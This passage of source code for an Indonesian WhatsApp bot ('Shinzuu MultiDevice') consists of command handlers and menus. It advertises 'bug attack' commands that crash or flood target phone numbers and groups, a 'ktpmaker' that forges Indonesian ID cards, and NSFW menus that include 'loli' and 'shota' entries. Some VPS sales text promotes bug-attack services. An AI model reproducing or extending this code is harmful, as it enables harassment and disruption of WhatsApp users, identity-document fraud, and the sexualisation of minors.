々 ${prefix}ᴀᴅᴅɢᴄᴡᴇʙᴘ

𖣂 *A N I M E - M E N U ッ*

々 ${prefix}ʜᴇɴᴛᴀɪ
々 ${prefix}ɢɪғʜᴇɴᴛᴀɪ
々 ${prefix}ɢɪғʙʟᴏᴡᴊᴏʙ
々 ${prefix}ʜᴇɴᴛᴀɪᴠɪᴅ
々 ${prefix}ʜɴᴇᴋᴏ
々 ${prefix}ɴᴡᴀɪғᴜ
々 ${prefix}ᴀɴɪᴍᴇsᴘᴀɴᴋ
々 ${prefix}ᴛʀᴀᴘ
々 ${prefix}ɢᴀsᴍ
々 ${prefix}ᴀʜᴇɢᴀᴏ
々 ${prefix}ᴀss
々 ${prefix}ʙʟᴏᴡᴊᴏʙ
々 ${prefix}ᴄᴜᴄᴋᴏʟᴅ
々 ${prefix}ᴄᴜᴍ
々 ${prefix}ᴍɪʟғ
々 ${prefix}ᴇʙᴀ
々 ${prefix}ᴇʀᴏ
々 ${prefix}ғᴇɴᴅᴏᴍ
々 ${prefix}ғᴏᴏᴛ
々 ${prefix}ɢᴀɴɢʙᴀɴɢ
々 ${prefix}ɢʟᴀssᴇs
々 ${prefix}ᴊᴀʜʏ
々 ${prefix}ᴍᴀsᴛᴜʀʙᴀᴛɪᴏɴ
々 ${prefix}ᴍᴀɴɢᴀ
々 ${prefix}ɴᴇᴋᴏ-ʜᴇɴᴛᴀɪ
々 ${prefix}ɴᴇᴋᴏ-ʜᴇɴᴛᴀɪ22
々 ${prefix}ɴsғᴡʟᴏʟɪ
々 ${prefix}ᴏʀɢʏ
々 ${prefix}ᴘᴀɴᴛɪᴇs
々 ${prefix}ᴘᴜssʏ
々 ${prefix}ᴛᴇɴᴛᴀᴄʟᴇs
々 ${prefix}ᴛʜɪɢʜs
々 ${prefix}ʏᴜʀɪ
々 ${prefix}ᴢᴇᴛᴛᴀɪ

𖣂 *A N I M E 2- M E N U ッ*

々 ${prefix}akira 
々 ${prefix}akiyama 
々 ${prefix}ana ??
々 ${prefix}asuna 
々 ${prefix}ayuzawa 
々 ${prefix}boruto 
々 ${prefix}chiho 
々 ${prefix}chitoge 
々 ${prefix}cosplayloli 
々 ${prefix}cosplaysagiri 
々 ${prefix}deidara 
々 ${prefix}doraemon 
々 ${prefix}elaina 
々 ${prefix}emilia 
々 ${prefix}erza 
々 ${prefix}gremory 
々 ${prefix}hestia 
々 ${prefix}hinata 
々 ${prefix}husbu 
々 ${prefix}inori 
々 ${prefix}isuzu 
々 ${prefix}itachi 
々 ${prefix}itori 
々 ${prefix}kaga 
々 ${prefix}kagura 
々 ${prefix}kakasih 
々 ${prefix}kaori 
々 ${prefix}keneki 
々 ${prefix}kotori 
々 ${prefix}kurumi 
々 ${prefix}loli 
々 ${prefix}madara 
々 ${prefix}megumin 
々 ${prefix}mikasa 
々 ${prefix}mikey 
々 ${prefix}miku 
々 ${prefix}minato 
々 ${prefix}naruto 
々 ${prefix}neko 
々 ${prefix}neko2 
々 ${prefix}nekonime 
々 ${prefix}nezuko 
々 ${prefix}onepiece 
々 ${prefix}pokemon 
々 ${prefix}randomnime 
々 ${prefix}randomnime2 
々 ${prefix}rize 
々 ${prefix}sagiri 
々 ${prefix}sakura 
々 ${prefix}sasuke 
々 ${prefix}shina 
々 ${prefix}shinka 
々 ${prefix}shinomiya 
々 ${prefix}shizuka 
々 ${prefix}shota 
々 ${prefix}tejina 
々 ${prefix}toukachan 
々 ${prefix}tsunade 
々 ${prefix}waifu 
々 ${prefix}animewall 
々 ${prefix}yotsuba 
々 ${prefix}yuki 
々 ${prefix}yulibocil 
々 ${prefix}yumeko 
々 ${prefix}8ball 
々 ${prefix}tickle 
々 ${prefix}gecg 
々 ${prefix}feed 
々 ${prefix}animeawoo 
々 ${prefix}animemegumin 
々 ${prefix}animeshinobu 
々 ${prefix}animehandhold 
々 ${prefix}animehighfive 
々 ${prefix}animecringe 
々 ${prefix}animedance 
々 ${prefix}animehappy 
々 ${prefix}animeglomp 
々 ${prefix}animeblush 
々 ${prefix}animesmug
々 ${prefix}animewave 
々 ${prefix}animesmille 
々 ${prefix}animepoke 
々 ${prefix}animewink 
々 ${prefix}animebonk 
々 ${prefix}animebully 
々 ${prefix}animeyeet 
々 ${prefix}animebite 
々 ${prefix}animelick 
々 ${prefix}animekill 
々 ${prefix}animecry 
々 ${prefix}animewlp 
々 ${prefix}animekiss 
々 ${prefix}ᴀɴɪᴍᴇʜᴜɢ
々 ${prefix}ᴀɴɪᴍᴇɴᴇᴋᴏ
々 ${prefix}ᴀɴɪɴᴇᴘᴀᴛ
々 ${prefix}ᴀɴɪᴍᴇsʟᴀᴘ
々 ${prefix}ᴀɴɪᴍᴇᴄᴜᴅᴅʟᴇ
々 ${prefix}ʙᴀɴɪɴᴇᴡᴀɪғᴜ
々 ${prefix}ᴀɴɪᴍᴇɴᴏᴍ
々 ${prefix}ᴀɴɪᴍᴇғᴏxɢɪʀʟ
々 ${prefix}ᴀɴɪᴍᴇɢᴇᴄɢᴇ
々 ${prefix}ᴀɴɪᴍᴇᴛɪᴋʟᴇ
々 ${prefix}ᴀɴɪᴍᴇғᴇᴇᴅ
々 ${prefix}ᴀɴɪᴍᴇᴀᴠᴀᴛᴀʀ
々 ${prefix}ɢᴇɴsʜɪɴ
々 ${prefix}ᴀɴɪᴍᴇ

𖣂 *A I - M E N U ッ*

々 ${prefix}ᴏᴘᴇɴᴀɪ
々 ${prefix}ᴀɪ
々 ${prefix}ᴀɪɪᴍᴀɢᴇ
々 ${prefix}ʀᴇᴍɪɴɪ

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio3.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "bugmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

𖣂 *L I S T - B U G - M E N U ッ*

々 ${prefix}ʙᴜɢɴᴜᴍʙᴇʀ
々 ${prefix}ʙᴜɢɢʀᴏᴜᴘ
々 ${prefix}ʙᴀɴɴᴇᴅᴍᴇɴᴜ
々 ${prefix}ᴜɴʙᴀɴᴍᴇɴᴜ
々 ${prefix}ʙᴜɢᴇᴍᴏᴊɪ
々 ${prefix}ʀᴇᴘᴏʀᴛʙᴜɢ

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: '𝚂 𝙷 𝙸 𝙽 𝚉 𝚄 - 𝙼 𝙳',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio2.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "listvps1": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LIST VPS LINODE* )▭▬▭

🚀 RAM 1GB CORE 1 : => *20K* <=
🚀 RAM 2GB CORE 1 : => *25K* <=
🚀 RAM 4GB CORE 2 : => *45K* <=
🚀 RAM 8GB CORE 4 : => *55K* <=
🚀 RAM 16GB CORE 6 : => *80K* <=

=>   *_𝙂𝙤𝙤𝙙 𝙌𝙪𝙖𝙡𝙞𝙩𝙮 ✅_* <=
=>   *_𝘽𝙚𝙧𝙜𝙖𝙧𝙖𝙣𝙨𝙞 ✅_*      <=
=>   *_𝘿𝙖𝙥𝙚𝙩 𝘽𝙤𝙣𝙪𝙨 ✅_*  <=

*‼️GARANSI ON JIKA TIDAK MELANGGAR TOS!!!*
1. NO MINING
2. NO CPU 100%
3. NO USE DDOS
*_GARANSI 10H ON ✅_*

*JIKA MELANGGAR T.O.S GARANSI HANGUS!!!*

*MAU CLAIM GARANSI? KIRIM BUKTI TRANSFER & CHAT*
‼️NO BUKTI NO GARANSI
‼️ MAKSA REFF NO BUKTI? BLOCK!!! 

*KEUNTUNGAN BUY VPS?*
📍BISA OPEN ADMIN PANEL
📍BISA OPEN RESELLER PANEL
📍BISA DI PAKAI BUAT SERVER PRIBADI
📍BISA JUALAN PANEL
📍BISA OPEN JASA RUN BOT
📍BISA OPEN MURPUSH
📍BISA OPEN MURBUG DLL


 Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, hardznum],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnail: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
 case 'nsfw': {
if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !isOwner) return XeonStickAdmin()
if (args[0] === "on") {
if (AntiNsfw) return reply('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
reply('Success in turning on nsfw in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replygcxeon('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
reply('Success in turning off nsfw in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break      
 case "listvps2": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LIST VPS DIGITAL OCEAN* )▭▬▭


🚀 RAM 2GB CORE 1 : => *25K* <=
🚀 RAM 4GB CORE 2 : => *45K* <=
🚀 RAM 8GB CORE 4 : => *55K* <=
🚀 RAM 16GB CORE 6 : => ~*130K*~ > *80K* <=

=>   *_𝙂𝙤𝙤𝙙 𝙌𝙪𝙖𝙡𝙞𝙩𝙮 ✅_* <=
=>   *_𝘽𝙚𝙧𝙜𝙖𝙧𝙖𝙣𝙨𝙞 ✅_*      <=
=>   *_𝘿𝙖𝙥𝙚𝙩 𝘽𝙤𝙣𝙪𝙨 ✅_*  <=

*‼️GARANSI ON JIKA TIDAK MELANGGAR TOS!!!*
1. NO MINING
2. NO CPU 100%
3. NO USE DDOS
*_GARANSI 10H ON ✅_*

*JIKA MELANGGAR T.O.S GARANSI HANGUS!!!*

*MAU CLAIM GARANSI? KIRIM BUKTI TRANSFER & CHAT*
‼️NO BUKTI NO GARANSI
‼️ MAKSA REFF NO BUKTI? BLOCK!!! 

*KEUNTUNGAN BUY VPS?*
📍BISA OPEN ADMIN PANEL
📍BISA OPEN RESELLER PANEL
📍BISA DI PAKAI BUAT SERVER PRIBADI
📍BISA JUALAN PANEL
📍BISA OPEN JASA RUN BOT
📍BISA OPEN MURPUSH
📍BISA OPEN MURBUG DLL


 Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, hardznum],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnail: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "ramlist1": { 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *RAM YANG TERSEDIA* )▭▬▭

*SERVER 1*
⭔1GB ( *Premium* )✅
⭔2GB ( *Premium* )✅
⭔3GB ( *Premium* )✅
⭔4GB ( *Premium* )✅
⭔5GB ( *Premium* )✅
⭔6GB ( *Owner* )✅
⭔7GB ( *Owner* )✅
⭔8GB ( *Owner* )✅
⭔9GB ( *Owner* )✅
⭔UNLI ( *Owner* )✅

*JOIN RESELLER CUMA 5K BANG😁*
 Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
} freya = fs.readFileSync('./freya/ramlist.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "groupmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:fkontak})
const txtus = `
*Hi @${sender.split("@")[0]} 👋*

𖣂 *G R O U P - M E N U*

々 ${prefix}ᴏᴡɴᴇʀ
々 ${prefix}ǫᴄ
々 ${prefix}ᴋᴛᴘᴍᴀᴋᴇʀ
々 ${prefix}ᴛᴛs
々 ${prefix}sᴛɪᴄᴋᴇʀ
々 ${prefix}ʟɪɴᴋɢʀᴏᴜᴘ
々 ${prefix}ʜɪᴅᴇᴛᴀɢ
々 ${prefix}sᴇᴛᴘᴘʙᴏᴛ
々 ${prefix}sᴇᴛᴘᴘɢʀᴏᴜᴘ
々 ${prefix}sᴇᴀʀᴄʜɢʀᴏᴜᴘs
々 ${prefix}ᴅᴇʟᴘᴘɢᴄ
々 ${prefix}ᴀᴅᴅ
々 ${prefix}ᴋɪᴄᴋ
々 ${prefix}ᴘʀᴏᴍᴏᴛᴇ
々 ${prefix}ᴅᴇᴍᴏᴛᴇ
々 ${prefix}ᴘʀᴏᴍᴏᴛᴇᴀʟʟ
々 ${prefix}ᴅᴇᴍᴏᴛᴇᴀʟʟ
々 ${prefix}ᴀɴᴛɪʟɪɴᴋ
々 ${prefix}ᴍᴜᴛᴇɢᴄ

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: txtus,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio4.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case 'ktpmaker': {
if (args.length == 0) return m.reply(`*Pengunaan :*\n${prefix+command} Nik|Provinsi|Kabupaten|Nama|TempatTanggalLahir|JenisKel|Alamat|RtRw|KelDesa|Kecamatan|Agama|Statu|Pekerjaan|Region|Berlaku|golongan darah|LinkGambar\n\n${prefix+command} 35567778995|Provinsi Jawa Barat|Kabupaten Bekasi|jebeh Store|Bekasi |Laki-Laki|Bintara Jaya|02/05|Karang Indah|Bekasi Barat|Islam|Jomblo|anakjebeh|Indonesia|2021-2080|abc|https://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\n\n\n*[warning]*\nsetiap input query setelah garis tengah | di larang penggunaan spasi\n*「 INFO IMAGE 」*\nUntuk Gambar Profil KTP\nUpload Dari Berikut Ini\n\nhttps://i.waifu.pics\nhttps://c.top4top.io\n\nCONTOH HASIL NYA\nhttps://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\nhttps://k.top4top.io/p_2208264hn0.jpg`)
get_args = args.join(" ").split("|")
nik = get_args[0]
if (!nik) return m.reply('nomor induk keluaga kak pastikan jangan mirip NIK yang asli ya')
prov = get_args[1]
if (!prov) return m.reply('probinsi mana kak')
kabu = get_args[2]
if (!kabu) return m.reply('kabupaten mana kak')
name = get_args[3]
if (!name) return m.reply('nama nya siapa kak')
ttl = get_args[4]
if (!ttl) return m.reply('tempat tanggal lahir nya kak')
jk = get_args[5]
if (!jk) return m.reply('jenis kelamin pria atau wanita kak')
jl = get_args[6]
if (!jl) return m.reply('alamat rumah nya mana kak')
rtrw = get_args[7]
if (!rtrw) return m.reply('RT / RW berapa kak')
lurah = get_args[8]
if (!lurah) return m.reply('kelurahan mana kak')
camat = get_args[9]
if (!camat) return m.reply('kecamatan mana kak')
agama = get_args[10]
if (!agama) return m.reply('agama nya apa kak')
nikah = get_args[11]
if (!nikah) return m.reply('status belum ada')
kerja = get_args[12]
if (!kerja) return m.reply('pekerjaan belum ada')
warga = get_args[13]
if (!warga) return m.reply('region belum ada')
until = get_args[14]
if (!until) return m.reply('waktu berlaku belum ada')
gd = get_args[15]
if (!gd) return m.reply('golongan darah belum ada')
img = get_args[16]
if (!img) return m.reply('url image belum ada')
      m.reply('Sabar Cuy Loading')
bikin = (`https://oni-chan.my.id/api/Fmake/ktpmaker?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gd=${gd}&almt=${jl}&rtw=${rtrw}&kel=${lurah}&kc=${camat}&agm=${agama}&st=${nikah}&krj=${kerja}&ngr=${warga}&blk=${until}&prv=${prov}&kab=${kabu}&picturl=${img}`)
console.log(bikin)
ardaktp = await getBuffer(bikin)
  await sleep(8000)
await Biiofc.sendMessage(from, { image: ardaktp, caption: `done kak` }, { quoted: m })
sticSukses(from)
//await sleep(5000)
}
break
case 'searchgroups':
if (!isOwner) return m.reply(`Lu Siapa`)
if (!q) return m.reply(`Example: ${prefix}searchgroups bokep`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
m.reply(res)
});
break
case "storemenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `
*Hi @${sender.split("@")[0]} 👋*

𖣂 *S T O R E - M E N U*

々 ${prefix}vps
々 ${prefix}done
々 ${prefix}done?
々 ${prefix}batal
々 ${prefix}tunda
々 ${prefix}proses
々 ${prefix}reqvps
々 ${prefix}reqpanel
々 ${prefix}addlist
々 ${prefix}dellist

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio2.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "ownermenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:fkontak})
const txtow = `
*Hi @${sender.split("@")[0]} 👋*

𖣂 *O W N E R - M E N U*

々 ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ
々 ${prefix}ᴅᴇʟᴏᴡɴᴇʀ
々 ${prefix}ᴀᴅᴅᴘʀᴇᴍ
々 ${prefix}ᴅᴇʟᴘʀᴇᴍ
々 ${prefix}sᴇʟғ
々 ${prefix}ᴘᴜʙʟɪᴄ
々 ${prefix}sʜᴜᴛᴅᴏᴡɴ
々 ${prefix}ʟᴇᴀᴠᴇ
々 ${prefix}ᴊᴏɪɴ
々 ${prefix}ᴄᴇᴋɪᴘ
々 ${prefix}ᴄʀᴇᴀᴛᴇɢᴄ
々 ${prefix}ɢᴇᴛғɪʟᴇ
々 ${prefix}ɢᴇᴛᴄᴀsᴇ
々 ${prefix}ᴇɴᴄ
々 ${prefix}ᴘᴜʜ1

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: txtow,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio1.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "getfile":{
if (!isOwner) return m.reply(`Khusus Owner Gw`)
if (m.isGroup) return m.reply(`Di Chat Privadi Bre`)
if (!text.includes("./")) return m.reply(`*Example* : ${prefix + command} ./appearance.json`)
setTimeout(() => {
const file = fs.readFileSync(`${text}`)
Biiofc.sendMessage(m.chat, { document: file, mimetype: "application/bin", fileName: `${path.basename(text)}` }, { quoted: m })
}, 2000)
m.reply("Send file......")
}
break
case "join": {
if (!isOwner) return m.reply(`Khusus Owner`)
if (!text) return m.reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await Biiofc.groupAcceptInvite(result).then((res) => m.reply(util.format(res))).catch((err) => m.reply(util.format(err)))
}
break
case 'leave': {
if (!isOwner) return reply(`Khusus HardzMods Aja`)
                await Biiofc.groupLeave(m.chat)
                await reply(`Done Tuan✅`)
            }
            break
case 'iptracker': case 'cekip': case 'getip':
{
if (!q) return m.reply(`Masukkan IP target contoh .iptracker 114.142.169.38`)
m.reply(`Menganalisa Ip....`)
fetchJson(`https://api.lolhuman.xyz/api/ipaddress/${args[0]}?apikey=${global.lolhuman2}`).then(res => {
m.reply(`
             _*IP TRACKER*_
*COUNTRY:* ${res.result.country}
*COUNTRY CODE:* ${res.result.countryCode}
*REGION:* ${res.result.region}
*REGION NAME:* ${res.result.regionName}
*CITY:* ${res.result.city}
*ZIP:* ${res.result.zip}
*LAT:* ${res.result.lat}
*LON:* ${res.result.lon}
*TIME ZONE:* ${res.result.timezone}
*ISP:* ${res.result.isp}
*ORG:* ${res.result.org}
*AS:* ${res.result.as}
*QUERY:* ${res.result.query}
`)
})
}
break
case 'creategc': case 'creategroup': {
if (!IsOwner) return m.reply(`Khusus Owner Gwe`)
if (!args.join(" ")) return m.reply(`Use ${prefix+command} groupname`)
try {
let cret = await Biiofc.groupCreate(args.join(" "), [])
let response = await Biiofc.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${hardznum.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
Biiofc.sendMessage(m.chat, { text:teks, mentions: await Biiofc.parseMention(teks)}, {quoted:m})
} catch {
m.reply("Error!")
}
}
break
case "bugnumber": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const txtat = `
*Hi @${sender.split("@")[0]} 👋*

𖣂 *B U G - A T T A C K - M E N U*

々 ${prefix}gas *nomor|jumlah*
々 ${prefix}kill *nomor|jumlah*
々 ${prefix}crash *nomor|jumlah*
々 ${prefix}shoot *nomor|jumlah*
々 ${prefix}bugkuy *nomor|jumlah*
々 ${prefix}duarr *nomor|jumlah*
々 ${prefix}killyou *nomor|jumlah*
々 ${prefix}doblekill *nomor|jumlah*
々 ${prefix}triplekill *nomor|jumlah*
々 ${prefix}savage *nomor|jumlah*
々 ${prefix}santet *nomor|jumlah*
々 ${prefix}danger *nomor|jumlah*
々 ${prefix}meninggal *nomor|jumlah*
々 ${prefix}headshot *nomor|jumlah*
々 ${prefix}mati *nomor|jumlah*

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: txtat,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio1.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "buggroup":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const txtv1 = `
*Hi @${sender.split("@")[0]} 👋*

𖣂 *B U G G R U P - M E N U*

々 ${prefix}killgc *linkgc|jumlah*
々 ${prefix}santetgc *linkgc|jumlah*
々 ${prefix}gcwakwaw *linkgc|jumlah*
々 ${prefix}togc *linkgc|jumlah*
々 ${prefix}matigc *linkgc|jumlah*
々 ${prefix}kuygc *linkgc|jumlah*
々 ${prefix}attackgc *linkgc|jumlah*
々 ${prefix}mampusgc *linkgc|jumlah*
々 ${prefix}gasgc *linkgc|jumlah*
々 ${prefix}ampasgc *linkgc|jumlah*
々 ${prefix}bahayagc *linkgc|jumlah*
々 ${prefix}hatihatigc *linkgc|jumlah*
々 ${prefix}crashgc *linkgc|jumlah*
々 ${prefix}stuckgc *linkgc|jumlah*
々 ${prefix}ganasgc *linkgc|jumlah*

𖣂 *B U G G R U P 2 - M E N U*

々 ${prefix}buggc *idgroup|jumlah*
々 ${prefix}shootgc *idgroup|jumlah*
々 ${prefix}dorrgc *idgroup|jumlah*
々 ${prefix}attackgc1 *idgroup|jumlah*
々 ${prefix}meninggalgc *idgroup|jumlah*
々 ${prefix}matigc1*idgroup|jumlah*
々 ${prefix}seranggc *idgroup|jumlah*
々 ${prefix}bomgc *idgroup|jumlah*
